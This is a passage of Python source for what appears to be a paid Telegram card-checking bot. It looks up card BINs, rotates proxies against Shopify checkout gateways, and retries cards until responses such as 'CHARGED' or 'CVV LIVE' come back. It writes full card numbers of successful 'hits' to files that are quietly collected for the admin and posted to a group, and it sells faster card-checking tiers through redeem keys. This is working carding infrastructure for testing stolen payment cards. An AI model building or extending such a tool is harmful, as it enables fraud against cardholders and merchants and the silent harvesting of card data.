                        country TEXT,
                        currency TEXT,
                        country_code TEXT,
                        timestamp REAL
                    )
                ''')
                conn.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON bin_cache(timestamp)')
                conn.execute('PRAGMA journal_mode=WAL')
                conn.execute('PRAGMA synchronous=NORMAL')
        except Exception as e:
            print(f"⚠️ BIN Cache init error: {e}")
    
    async def get_bin_info(self, cc: str) -> tuple:
        """Get BIN info with caching (L1 memory, L2 SQLite)"""
        bin_num = cc[:6]
        
        if not bin_num.isdigit() or len(bin_num) != 6:
            return "N/A", "N/A", "🌐 N/A", "N/A", "N/A"
        
        # Check memory cache
        if bin_num in self.memory_cache:
            cache_entry = self.memory_cache[bin_num]
            if time.time() - cache_entry['timestamp'] < 86400:
                self.hits += 1
                return cache_entry['data']
        
        # Check SQLite
        try:
            with sqlite3.connect(self.db_path, timeout=5) as conn:
                cursor = conn.execute(
                    'SELECT bin_info, bank, country, currency, country_code FROM bin_cache WHERE bin = ? AND timestamp > ?',
                    (bin_num, time.time() - 86400)
                )
                row = cursor.fetchone()
                
                if row:
                    result = (row[0], row[1], row[2], row[3], row[4])
                    self.memory_cache[bin_num] = {
                        'data': result,
                        'timestamp': time.time()
                    }
                    self.hits += 1
                    return result
        except Exception as e:
            print(f"⚠️ SQLite read error: {e}")
        
        self.misses += 1
        result = await self._fetch_bin_api(bin_num)
        
        # Cache in SQLite
        try:
            bin_info, bank, country, currency, country_code = result
            with sqlite3.connect(self.db_path, timeout=5) as conn:
                conn.execute(
                    'INSERT OR REPLACE INTO bin_cache (bin, bin_info, bank, country, currency, country_code, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)',
                    (bin_num, bin_info, bank, country, currency, country_code, time.time())
                )
            
            self.memory_cache[bin_num] = {
                'data': result,
                'timestamp': time.time()
            }
        except Exception as e:
            print(f"⚠️ SQLite write error: {e}")
        
        return result
    
    async def _fetch_bin_api(self, bin_num: str) -> tuple:
        """Fetch BIN info from API (fallback when not in cache)"""
        try:
            headers = {
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept-Language": "en-US,en;q=0.9"
            }
            
            apis = [
                f"https://lookup.binlist.net/{bin_num}",
                f"https://bin-ip.com/api/bin/{bin_num}",
            ]
            
            async with httpx.AsyncClient(timeout=5) as client:
                for api_url in apis:
                    try:
                        response = await client.get(api_url, headers=headers)
                        if response.status_code == 200:
                            data = response.json()
                            
                            if 'scheme' in data:
                                scheme = data.get('scheme', 'N/A')
                                type_ = data.get('type', 'N/A')
                                brand = data.get('brand', 'N/A')
                                prepaid = data.get('prepaid', False)
                                
                                card_info = []
                                if scheme != 'N/A':
                                    card_info.append(scheme.upper())
                                if type_ != 'N/A':
                                    card_info.append(type_.upper())
                                if brand != 'N/A' and brand != scheme:
                                    card_info.append(brand.upper())
                                if prepaid:
                                    card_info.append('PREPAID')
                                
                                bin_info = " - ".join(card_info) if card_info else "N/A"
                                bank = data.get('bank', {}).get('name', 'N/A')
                                country_data = data.get('country', {})
                                country = country_data.get('name', 'N/A')
                                flag = country_data.get('emoji', '🌐')
                                currency = country_data.get('currency', 'N/A')
                                country_code = country_data.get('alpha2', 'N/A')
                                
                                return bin_info, bank, f"{flag} {country}", currency, country_code
                    except:
                        continue
        except:
            pass
        
        return "N/A", "N/A", "🌐 N/A", "N/A", "N/A"
    
    def get_stats(self) -> dict:
        """Get cache statistics"""
        total = self.hits + self.misses
        hit_rate = (self.hits / total * 100) if total > 0 else 0
        return {
            "hits": self.hits,
            "misses": self.misses,
            "total": total,
            "hit_rate": hit_rate,
            "memory_cache_size": len(self.memory_cache)
        }

bin_cache = BINCache()

async def get_bin_info(cc):
    """BIN lookup with caching - MUCH FASTER"""
    result = await bin_cache.get_bin_info(cc)
    
    # If all values are N/A, try to extract basic info from the card number
    if result[0] == "N/A" and result[1] == "N/A":
        bin_num = cc[:6]
        # Determine card brand from first digit
        if bin_num.startswith('4'):
            brand = "VISA"
        elif bin_num.startswith('5'):
            brand = "MASTERCARD"
        elif bin_num.startswith('3'):
            if bin_num.startswith('34') or bin_num.startswith('37'):
                brand = "AMEX"
            else:
                brand = "DINERS"
        elif bin_num.startswith('6'):
            brand = "DISCOVER"
        else:
            brand = "UNKNOWN"
        
        return (f"{brand} - CREDIT", "Unknown", "🌐 Unknown", "USD", "US")
    
    return result

# ============ GROUP MEMBERSHIP CHECK ============
OWNER_ID = 6299808404

async def check_group_membership(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user has joined the required Telegram group"""
    user_id = update.effective_user.id
    
    if user_id == OWNER_ID:
        return True
    
    try:
        member = await context.bot.get_chat_member(chat_id=GROUP_ID, user_id=user_id)
        
        if member.status in ['member', 'administrator', 'creator']:
            return True
        else:
            await update.message.reply_text(
                f"❌ <b>You are not a member of the required group!</b>\n\n"
                f"Please join {REQUIRED_GROUP} first:\n"
                f"{REQUIRED_GROUP_LINK}\n\n"
                f"After joining, try again.",
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
            return False
            
    except Exception as e:
        error_msg = str(e).lower()
        print(f"⚠️ Group check error: {e}")
        
        if "chat not found" in error_msg:
            await update.message.reply_text(
                f"❌ <b>Bot Configuration Error</b>\n\n"
                f"The bot cannot find the required group.\n\n"
                f"Please make sure:\n"
                f"1. The bot is added to {REQUIRED_GROUP}\n"
                f"2. The bot is an administrator in the group\n"
                f"3. The correct GROUP_ID is set in the code\n\n"
                f"Contact the bot owner for assistance.",
                parse_mode=ParseMode.HTML
            )
        elif "user not found" in error_msg:
            await update.message.reply_text(
                f"❌ <b>You are not in the required group!</b>\n\n"
                f"Please join {REQUIRED_GROUP} first:\n"
                f"{REQUIRED_GROUP_LINK}\n\n"
                f"After joining, try again.",
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        else:
            await update.message.reply_text(
                f"❌ <b>Group verification error</b>\n\n"
                f"Could not verify your group membership.\n"
                f"Please try again later or contact support.\n\n"
                f"Error: {str(e)[:100]}",
                parse_mode=ParseMode.HTML
            )
        return False

async def verify_group_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Wrapper function to verify group access before commands"""
    if not await check_group_membership(update, context):
        return False
    return True

# ============ HIT STORAGE FUNCTIONS ============
async def save_hit_to_file(card: str, gateway: str, response: str, price: str, bin_info: tuple, user_id: int, user_tier: str):
    """Save hit to file and send to admin when batch size reached"""
    global hit_counter, last_hit_file_time
    
    bin_info_text, bank, country, currency_code, country_code = bin_info if bin_info else ("N/A", "N/A", "🌐 N/A", "N/A", "N/A")
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hit_entry = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 Card: {card}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 Gateway: {gateway}\n"
        f"📝 Response: {response}\n"
        f"💰 Price: {price}\n"
        f"📊 BIN: {bin_info_text}\n"
        f"🏦 Bank: {bank}\n"
        f"🌍 Country: {country}\n"
        f"👤 User: {user_id}\n"
        f"🎯 Tier: {user_tier}\n"
        f"⏱️ Time: {timestamp}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    try:
        with open(HITS_FILE, 'a', encoding='utf-8') as f:
            f.write(hit_entry)
        
        hit_counter += 1
        print(f"💾 Hit #{hit_counter} saved to file")
        
        if hit_counter >= HITS_BATCH_SIZE:
            await send_hits_to_admin()
            
    except Exception as e:
        print(f"⚠️ Error saving hit to file: {e}")

async def send_hits_to_admin():
    """Send accumulated hits file to admin silently"""
    global hit_counter, last_hit_file_time
    
    try:
        if Path(HITS_FILE).exists() and Path(HITS_FILE).stat().st_size > 0:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"hits_backup_{timestamp}.txt"
            
            import shutil
            shutil.copy2(HITS_FILE, backup_file)
            
            print(f"📁 Hits file ready: {backup_file} with {hit_counter} hits")
            
            with open(HITS_FILE, 'w', encoding='utf-8') as f:
                f.write("")
            
            hit_counter = 0
            last_hit_file_time = time.time()
            print("📤 Hits file cleared and ready for next batch")
            
    except Exception as e:
        print(f"⚠️ Error in send_hits_to_admin: {e}")
        

PENDING_HIT_NOTIFICATIONS = []  # Batch hits before sending
HIT_BATCH_SIZE = 10
HIT_BATCH_INTERVAL = 10  # Send batch every 10 seconds

async def send_batched_hit_notifications(context):
    """Send batched hit notifications to avoid flood control"""
    global PENDING_HIT_NOTIFICATIONS
    
    if not PENDING_HIT_NOTIFICATIONS:
        return
    
    # Take a batch
    batch = PENDING_HIT_NOTIFICATIONS[:HIT_BATCH_SIZE]
    PENDING_HIT_NOTIFICATIONS = PENDING_HIT_NOTIFICATIONS[HIT_BATCH_SIZE:]
    
    # Combine into single message
    combined = "🔔 <b>New Hits Detected</b>\n\n"
    for notification in batch:
        combined += notification + "\n---\n"
    
    try:
        await context.bot.send_message(
            chat_id=HIT_NOTIFICATION_GROUP_ID,
            text=combined,
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        print(f"Failed to send batched hits: {e}")

# ============ ULTRA SAFE FLOOD CONTROL MANAGER ============
class SafeFloodControlManager:
    """Extremely conservative flood control to prevent Telegram bans"""
    
    def __init__(self):
        self.message_queue = asyncio.Queue()
        self.last_message_time = 0
        self.min_interval = 1.0  # INCREASED from 3.0 to 5.0 seconds
        self.consecutive_floods = 0
        self.current_delay = 1.0  # INCREASED from 3.0 to 5.0
        self._worker_task = None
        self._running = False
        self._lock = asyncio.Lock()
        
        # Statistics
        self.sent_count = 0
        self.queued_count = 0
        
    def start(self):
        self._running = True
        return self
        
    async def start_async(self):
        self._worker_task = asyncio.create_task(self._worker())
        print("✅ Safe flood control worker started (3s min interval)")
        
    async def stop(self):
        self._running = False
        if self._worker_task:
            self._worker_task.cancel()
            try:
                await self._worker_task
            except:
                pass
        print(f"📊 Flood control stats: {self.sent_count} sent, {self.queued_count} queued")
    
    async def _worker(self):
        """Worker to send messages with EXTREME caution"""
        while self._running:
            try:
                try:
                    item = await asyncio.wait_for(self.message_queue.get(), timeout=2.0)
                except asyncio.TimeoutError:
                    continue
                
                if not item:
                    continue
                
                context, chat_id, text, kwargs = item
                
                # Calculate wait time - ALWAYS wait at least min_interval
                async with self._lock:
                    now = time.time()
                    time_since_last = now - self.last_message_time
                    
                    # Always wait min_interval seconds between messages
                    wait_time = max(self.min_interval, self.current_delay) - time_since_last
                    if wait_time > 0:
                        await asyncio.sleep(wait_time)
                    
                    # Send the message
                    try:
                        await context.bot.send_message(
                            chat_id=chat_id,
                            text=text,
                            **kwargs
                        )
                        self.last_message_time = time.time()
                        self.sent_count += 1
                        
                        # Slowly reduce delay if we're doing well
                        if self.current_delay > self.min_interval:
                            self.current_delay = max(self.min_interval, self.current_delay * 0.98)
                        
                    except Exception as e:
                        error_str = str(e).lower()
                        print(f"❌ Send error: {e}")
                        
                        if "retry after" in error_str:
                            match = re.search(r'retry after (\d+)', error_str)
                            if match:
                                retry_after = int(match.group(1))
                                print(f"⚠️ Flood control: need to wait {retry_after}s")
                                self.consecutive_floods += 1
                                # Increase delay significantly
                                self.current_delay = min(60.0, retry_after + (self.consecutive_floods * 5))
                                # Re-queue the message
                                await self.message_queue.put(item)
                                await asyncio.sleep(retry_after)
                                continue
                        else:
                            print(f"❌ Error: {e}")
                    
                    self.message_queue.task_done()
                    
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"❌ Worker error: {e}")
                await asyncio.sleep(1)
    
    async def send_message(self, context, chat_id: int, text: str, **kwargs):
        """Queue a message to be sent"""
        self.queued_count += 1
        await self.message_queue.put((context, chat_id, text, kwargs))
    
    def get_stats(self):
        return {
            "sent": self.sent_count,
            "queued": self.queued_count,
            "current_delay": self.current_delay
        }

# Initialize flood control manager
flood_control = SafeFloodControlManager()

AUTOSOPI_RETRY_CONFIG = {
    "max_retries": 5,  # Maximum retries per card
    "retry_delay": 2,  # Seconds between retries
    "errors_to_retry": [
        "SITE DEAD",
        "SUBMIT REJECTED", 
        "PROXY DEAD",
        "FAILED TO PERFORM",
        "TOKENIZE_FAIL",
        "CONNECTION ERROR",
        "TIMEOUT"
    ]
}


# ============ SMART PROXY TRACKER FOR AUTOSOPI ============

class AutosopiProxyTracker:
    """
    Track proxy performance and only use proxies that return valid responses
    Valid responses: OTP_REQUIRED, CARD_DECLINED, INSUFFICIENT FUNDS, CVV LIVE, etc.
    """
    
    def __init__(self):
        self.working_proxies = {}  # user_id -> list of working proxies
        self.proxy_performance = {}  # proxy -> {success_count, fail_count, last_used, response_time}
        self.proxy_rotation_index = {}  # user_id -> current index
        self.proxy_last_used = {}  # proxy -> last used timestamp
        self.min_delay_between_uses = 1  # seconds between using same proxy
        
    def is_valid_response(self, response_text: str) -> bool:
        """Check if response indicates proxy is working"""
        response_upper = response_text.upper()
        
        # Valid responses that mean proxy is WORKING
        valid_patterns = [
            "CARD_DECLINED",
            "OTP_REQUIRED", 
            "3D REQUIRED",
            "INSUFFICIENT FUNDS",
            "INSUFFICIENT_FUNDS",
            "CVV LIVE",
            "INCORRECT_CVV",
            "CVV_MISMATCH",
            "DO NOT HONOR",
            "EXPIRED CARD",
            "GENERIC_ERROR",
            "DECLINED",
            "CHARGED",
            "ORDER COMPLETED",
            "APPROVED",
            "SUCCESS",
            "PAID",
            "NO_SESSION_TOKEN"  # Site error but proxy works
        ]
        
        # Invalid responses that mean proxy is DEAD
        invalid_patterns = [
            "PROXY DEAD",
            "SITE DEAD",
            "CONNECTION ERROR",
            "TIMEOUT",
            "INVALID PROXY",
            "PROXY AUTHENTICATION FAILED",
            "FAILED TO CONNECT",
            "CONNECTION REFUSED",
            "COULD NOT RESOLVE PROXY",
            "GETADDRINFO() THREAD FAILED",
            "CURL: (5)",  # Proxy resolution error
            "CURL: (6)",  # DNS error
            "CURL: (7)",  # Connection error
            "EMPTY_RESPONSE"
        ]
        
        # Check if it's a valid response (proxy working)
        if any(pattern in response_upper for pattern in valid_patterns):
            return True
        
        # Check if it's an invalid response (proxy dead)
        if any(pattern in response_upper for pattern in invalid_patterns):
            return False
        
        # Unknown response - assume working if we got any response
        return bool(response_text) and len(response_text) > 10
    
    async def record_proxy_result(self, user_id: int, proxy: str, response_text: str, response_time: float):
        """Record proxy result and update working status"""
        if not proxy:
            return
        
        is_working = self.is_valid_response(response_text)
        
        # Initialize tracking for this proxy
        if proxy not in self.proxy_performance:
            self.proxy_performance[proxy] = {
                'success_count': 0,
                'fail_count': 0,
                'total_checks': 0,
                'avg_response_time': 0,
                'last_response': response_text[:100],
                'last_used': 0,
                'is_working': True
            }
        
        stats = self.proxy_performance[proxy]
        stats['total_checks'] += 1
        stats['avg_response_time'] = (stats['avg_response_time'] * (stats['total_checks'] - 1) + response_time) / stats['total_checks']
        stats['last_response'] = response_text[:100]
        
        if is_working:
            stats['success_count'] += 1
            stats['is_working'] = True
            
            # Add to user's working proxies if not already there
            if user_id not in self.working_proxies:
                self.working_proxies[user_id] = []
            if proxy not in self.working_proxies[user_id]:
                self.working_proxies[user_id].append(proxy)
                print(f"✅ Proxy {mask_proxy(proxy)} added to working pool for user {user_id}")
        else:
            stats['fail_count'] += 1
            stats['is_working'] = False
            
            # Remove from user's working proxies
            if user_id in self.working_proxies and proxy in self.working_proxies[user_id]:
                self.working_proxies[user_id].remove(proxy)
                print(f"❌ Proxy {mask_proxy(proxy)} removed from working pool (dead)")
        
        # Log performance
        success_rate = (stats['success_count'] / stats['total_checks'] * 100) if stats['total_checks'] > 0 else 0
        print(f"📊 Proxy {mask_proxy(proxy)} - Success rate: {success_rate:.1f}% ({stats['success_count']}/{stats['total_checks']})")
    
    def get_working_proxy(self, user_id: int, exclude_proxy: str = None) -> Optional[str]:
        """Get a working proxy for a user, rotating through them"""
        if user_id not in self.working_proxies or not self.working_proxies[user_id]:
            # Fallback to user's original proxies
            if user_id in proxy_manager.user_proxies and proxy_manager.user_proxies[user_id]:
                return proxy_manager.user_proxies[user_id][0]
            return None
        
        working = self.working_proxies[user_id]
        
        # Filter out excluded proxy
        available = [p for p in working if p != exclude_proxy]
        
        if not available:
            # If only one proxy and it's excluded, return it anyway
            available = working
        
        # Sort by performance (best first)
        available.sort(key=lambda p: self.proxy_performance.get(p, {}).get('success_count', 0), reverse=True)
        
        # Get rotation index
        if user_id not in self.proxy_rotation_index:
            self.proxy_rotation_index[user_id] = 0
        
        # Rotate through proxies
        idx = self.proxy_rotation_index[user_id] % len(available)
        selected = available[idx]
        self.proxy_rotation_index[user_id] = idx + 1
        
        # Update last used
        self.proxy_last_used[selected] = time.time()
        
        print(f"🔄 [ProxyTracker] Using proxy: {mask_proxy(selected)} ({idx+1}/{len(available)})")
        return selected
    
    def get_proxy_stats(self, user_id: int) -> str:
        """Get formatted proxy statistics for a user"""
        if user_id not in self.working_proxies or not self.working_proxies[user_id]:
            return "❌ No working proxies found. Run /aptest to test your proxies."
        
        msg = f"🔌 <b>Working Proxies ({len(self.working_proxies[user_id])})</b>\n\n"
        
        for proxy in self.working_proxies[user_id][:10]:
            stats = self.proxy_performance.get(proxy, {})
            success_rate = (stats.get('success_count', 0) / stats.get('total_checks', 1) * 100)
            msg += f"• {mask_proxy(proxy)}\n"
            msg += f"  ✅ Success: {stats.get('success_count', 0)}/{stats.get('total_checks', 0)} ({success_rate:.0f}%)\n"
            msg += f"  ⚡ Avg: {stats.get('avg_response_time', 0):.1f}s\n\n"
        
        return msg
    
    def clear_user_proxies(self, user_id: int):
        """Clear working proxies for a user (force retest)"""
        if user_id in self.working_proxies:
            self.working_proxies[user_id] = []
        if user_id in self.proxy_rotation_index:
            del self.proxy_rotation_index[user_id]
        print(f"🗑️ Cleared proxy cache for user {user_id}")

# Create global instance
autosopi_proxy_tracker = AutosopiProxyTracker()

# ============ BROADCAST SYSTEM ============
BROADCAST_FILE = "broadcast.json"

class BroadcastManager:
    """Manage broadcast messages to users"""
    
    def __init__(self, broadcast_file=BROADCAST_FILE):
        self.broadcast_file = broadcast_file
        self.pending = self.load_pending()
    
    def load_pending(self):
        """Load pending broadcasts"""
        if Path(self.broadcast_file).exists():
            try:
                with open(self.broadcast_file, 'r') as f:
                    return json.load(f)
            except:
                return []
        return []
    
    def save_pending(self):
        """Save pending broadcasts"""
        try:
            with open(self.broadcast_file, 'w') as f:
                json.dump(self.pending, f, indent=2)
        except:
            pass
    
    def add_broadcast(self, message: str, admin_id: int):
        """Add a broadcast message"""
        broadcast_id = str(uuid.uuid4())[:8]
        self.pending.append({
            "id": broadcast_id,
            "message": message,
            "admin_id": admin_id,
            "created_at": time.time(),
            "sent_to": [],
            "status": "pending"
        })
        self.save_pending()
        return broadcast_id
    
    def get_next_broadcast(self):
        """Get next pending broadcast"""
        for broadcast in self.pending:
            if broadcast["status"] == "pending":
                return broadcast
        return None
    
    def mark_sent(self, broadcast_id: str, user_id: int):
        """Mark broadcast as sent to user"""
        for broadcast in self.pending:
            if broadcast["id"] == broadcast_id:
                if user_id not in broadcast["sent_to"]:
                    broadcast["sent_to"].append(user_id)
                self.save_pending()
                return True
        return False
    
    def complete_broadcast(self, broadcast_id: str):
        """Mark broadcast as complete"""
        for broadcast in self.pending:
            if broadcast["id"] == broadcast_id:
                broadcast["status"] = "completed"
                broadcast["completed_at"] = time.time()
                self.save_pending()
                return True
        return False
    
    def get_stats(self):
        """Get broadcast statistics"""
        total = len(self.pending)
        pending = sum(1 for b in self.pending if b["status"] == "pending")
        completed = sum(1 for b in self.pending if b["status"] == "completed")
        total_sent = sum(len(b.get("sent_to", [])) for b in self.pending)
        return {
            "total": total,
            "pending": pending,
            "completed": completed,
            "total_sent": total_sent
        }

broadcast_manager = BroadcastManager()

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast a message to all users (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "📢 <b>Broadcast System</b>\n\n"
            "Usage: /broadcast <message>\n"
            "Example: /broadcast Bot will be down for maintenance in 1 hour\n\n"
            "Commands:\n"
            "/broadcast_status - Check broadcast status",
            parse_mode=ParseMode.HTML
        )
        return
    
    message = " ".join(context.args)
    broadcast_id = broadcast_manager.add_broadcast(message, update.effective_user.id)
    
    await update.message.reply_text(
        f"✅ <b>Broadcast queued!</b>\n\n"
        f"ID: <code>{broadcast_id}</code>\n"
        f"Message: {message}\n\n"
        f"The message will be sent to all users gradually.",
        parse_mode=ParseMode.HTML
    )

async def broadcast_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check broadcast status (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    stats = broadcast_manager.get_stats()
    
    msg = "📢 <b>Broadcast Statistics</b>\n\n"
    msg += f"📊 Total Broadcasts: {stats['total']}\n"
    msg += f"⏳ Pending: {stats['pending']}\n"
    msg += f"✅ Completed: {stats['completed']}\n"
    msg += f"📨 Total Messages Sent: {stats['total_sent']}\n\n"
    
    if broadcast_manager.pending:
        msg += "<b>Pending Broadcasts:</b>\n"
        for b in broadcast_manager.pending:
            if b["status"] == "pending":
                created = datetime.fromtimestamp(b["created_at"]).strftime("%Y-%m-%d %H:%M")
                msg += f"• <code>{b['id']}</code>: {b['message'][:50]}... ({created})\n"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    
    
    
# ============ NEW SHOPIFY MASS API CONFIGURATION ============
SHOPIFY_MASS_API_BASE = "http://108.165.12.183:8081"
SHOPIFY_MASS_API_ENDPOINT = f"{SHOPIFY_MASS_API_BASE}/"

# Global variables for new mass check
shopify_mass_active_tasks = {}  # Track active sessions

# ============ REDEEM KEY SYSTEM - FIXED ============
KEYS_FILE = "keys.json"

class KeyManager:
    def __init__(self, keys_file=KEYS_FILE):
        self.keys_file = keys_file
        self.keys = self.load_keys()

    def load_keys(self):
        if Path(self.keys_file).exists():
            try:
                with open(self.keys_file, 'r') as f:
                    return json.load(f)
            except Exception as e:
                print(f"⚠️ Error loading keys: {e}")
                return {}
        return {}

    def save_keys(self):
        try:
            with open(self.keys_file, 'w') as f:
                json.dump(self.keys, f, indent=2)
        except Exception as e:
            print(f"⚠️ Error saving keys: {e}")

    def generate_key(self, tier: str, duration_days: int, created_by: int) -> str:
        key = str(uuid.uuid4()).upper()[:16]
        key = '-'.join([key[i:i+4] for i in range(0, 16, 4)])
        expiry = (datetime.now() + timedelta(days=duration_days)).timestamp() if duration_days > 0 else 0
        self.keys[key] = {
            "tier": tier,
            "duration_days": duration_days,
            "expiry": expiry,
            "created_by": created_by,
            "created_at": time.time(),
            "used_by": None,
            "used_at": None,
            "active": True
        }
        self.save_keys()
        return key

    def bulk_generate_keys(self, tier: str, duration_days: int, count: int, created_by: int) -> List[str]:
        keys = []
        for i in range(count):
            key = self.generate_key(tier, duration_days, created_by)
            keys.append(key)
            time.sleep(0.1)
        return keys

    def redeem_key(self, key: str, user_id: int) -> Tuple[bool, str, dict]:
        key = key.upper().strip()
        if key not in self.keys:
            return False, "❌ Invalid key.", None
        key_data = self.keys[key]
        if not key_data.get("active", True):
            return False, "❌ This key has been deactivated.", None
        if key_data.get("used_by") is not None:
            return False, "❌ This key has already been used.", None
        if key_data.get("expiry", 0) > 0:
            current_time = time.time()
            if current_time > key_data["expiry"]:
                key_data["active"] = False
                self.save_keys()
                return False, "❌ This key has expired.", None
        key_data["used_by"] = user_id
        key_data["used_at"] = time.time()
        key_data["active"] = False
        self.save_keys()
        return True, "✅ Key redeemed successfully!", key_data

    def deactivate_key(self, key: str, admin_id: int) -> bool:
        key = key.upper().strip()
        if key in self.keys:
            self.keys[key]["active"] = False
            self.save_keys()
            return True
        return False

    def list_keys(self) -> List[dict]:
        keys_list = []
        for key, data in self.keys.items():
            keys_list.append({
                "key": key,
                "tier": data["tier"],
                "duration": data["duration_days"],
                "created": datetime.fromtimestamp(data["created_at"]).strftime("%Y-%m-%d %H:%M"),
                "used_by": data["used_by"],
                "used_at": datetime.fromtimestamp(data["used_at"]).strftime("%Y-%m-%d %H:%M") if data["used_at"] else "Not used",
                "active": data["active"],
                "expiry": datetime.fromtimestamp(data["expiry"]).strftime("%Y-%m-%d %H:%M") if data["expiry"] > 0 else "Never"
            })
        return sorted(keys_list, key=lambda x: x["created"], reverse=True)

    def check_expired_keys(self):
        current_time = time.time()
        changed = False
        for key, data in self.keys.items():
            if data.get("active", True) and data.get("expiry", 0) > 0:
                if current_time > data["expiry"]:
                    data["active"] = False
                    changed = True
                    print(f"🔑 Key {key} expired and deactivated")
        if changed:
            self.save_keys()

key_manager = KeyManager()

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔑 <b>Redeem Key</b>\n\n"
            "Usage: /redeem <key>\n"
            "Example: /redeem XXXX-XXXX-XXXX-XXXX\n\n"
            "Redeem a key to upgrade your tier for a limited time.",
            parse_mode=ParseMode.HTML
        )
        return
    
    key = context.args[0]
    
    success, message, key_data = key_manager.redeem_key(key, user_id)
    
    if success and key_data:
        # Get user from UserManager
        user_data = user_manager.get_user(user_id)
        
        # Store original tier before upgrade
        original_tier = user_data["tier"]
        new_tier = key_data['tier']
        duration_days = key_data['duration_days']
        
        # Update user's tier
        user_data["tier"] = new_tier
        user_data["upgraded_from"] = original_tier
        
        # Track keys redeemed
        user_data["keys_redeemed"] = user_data.get("keys_redeemed", 0) + 1
        
        # Set expiry if not permanent
        if duration_days > 0:
            user_data["tier_expiry"] = time.time() + (duration_days * 86400)
        else:
            user_data["tier_expiry"] = 0
        
        # Save users to file immediately
        user_manager.save_users()
        
        # Also update cache if UserManager has one
        if hasattr(user_manager, 'cache') and user_id in user_manager.cache:
            user_manager.cache[user_id] = user_data
        
        # Get updated stats for display
        stats = user_manager.get_user_stats(user_id)
        
        # Send confirmation to user
        await update.message.reply_text(
            f"✅ <b>Key Redeemed Successfully!</b>\n\n"
            f"🎯 <b>New Tier: {stats['emoji']} {new_tier.upper()}</b>\n"
            f"⏱️ Duration: {duration_days} days\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ New Speed: {TIER_SPEEDS.get(new_tier, 2000)} cards/hour\n"
            f"🔀 Concurrency: {user_manager.TIERS[new_tier]['concurrency']}\n"
            f"📦 Max Batch: {user_manager.TIERS[new_tier]['max_batch_size']}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"Use /tier to see your updated stats.\n"
            f"Use /info to see your redeemed keys count.",
            parse_mode=ParseMode.HTML
        )
        
        # Send New Plan Purchase notification to hit notification group
        await send_plan_purchase_notification(
            context=context,
            user_id=user_id,
            username=user.username or user.first_name,
            first_name=user.first_name,
            tier=new_tier,
            duration_days=duration_days
        )
        
        print(f"✅ User {user_id} upgraded from {original_tier} to {new_tier} for {duration_days} days")
        
    else:
        await update.message.reply_text(message, parse_mode=ParseMode.HTML)
        
async def send_plan_purchase_notification(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, first_name: str, tier: str, duration_days: int):
    """Send New Plan Purchase notification to hit notification group - UPDATED FORMAT"""
    
    # Only send to hit notification group
    if not HIT_NOTIFICATION_ENABLED:
        return
    
    # Determine price based on tier and duration
    price_map = {
        "free": {"1": 0, "7": 0, "15": 0, "30": 0},
        "premium": {"1": 0, "7": 3, "15": 8, "30": 10},
        "ultimate": {"1": 1, "7": 5, "15": 10, "30": 20},
        "admin": {"1": 0, "7": 0, "15": 0, "30": 0}
    }
    
    # Get price based on tier and duration
    tier_lower = tier.lower()
    if tier_lower in price_map:
        if duration_days == 1:
            price = price_map[tier_lower].get("1", 0)
        elif duration_days == 7:
            price = price_map[tier_lower].get("7", 0)
        elif duration_days == 15:
            price = price_map[tier_lower].get("15", 0)
        elif duration_days == 30:
            price = price_map[tier_lower].get("30", 0)
        else:
            price = price_map[tier_lower].get(str(duration_days), 0)
    else:
        price = 0
    
    # Determine plan name and emoji
    plan_display = {
        "premium": "🔥 PREMIUM",
        "ultimate": "😈 ULTIMATE",
        "admin": "💀 ADMIN",
        "free": "🆓 FREE"
    }.get(tier_lower, tier.upper())
    
    # For TRAIL (1 day)
    if duration_days == 1:
        plan_display = "🎯 TRAIL"
        price_display = "Free"
        price_actual = 0
    else:
        price_display = f"${price}"
        price_actual = price
    
    # Duration text
    if duration_days == 1:
        duration_text = "1 day"
    elif duration_days == 7:
        duration_text = "7 days"
    elif duration_days == 15:
        duration_text = "15 days"
    elif duration_days == 30:
        duration_text = "30 days"
    else:
        duration_text = f"{duration_days} days"
    
    # User display
    user_display = f"{first_name}"
    if username:
        user_display += f" (@{username})"
    
    # Generate receipt number
    receipt_number = f"BLD-{datetime.now().strftime('%Y%m%d')}-{random.randint(1000, 9999)}"
    
    # ============ UPDATED NOTIFICATION FORMAT ============
    notification = (
        f"╔══════════════════════════╗\n"
        f"      🛒 NEW PLAN PURCHASED\n"
        f"╚══════════════════════════╝\n\n"
        f"👤 <b>User</b> ➛ {user_display}\n"
        f"👑 <b>Plan</b>  ➛ {plan_display}\n"
        f"💰 <b>Price</b> ➛ {price_display}\n"
        f"🧾 <b>Receipt</b> ➛ <code>{receipt_number}</code>\n"
        f"🤖 <b>Bot</b> ➛ @Bladesarksbot"
    )
    
    try:
        await context.bot.send_message(
            chat_id=HIT_NOTIFICATION_GROUP_ID,
            text=notification,
            parse_mode=ParseMode.HTML
        )
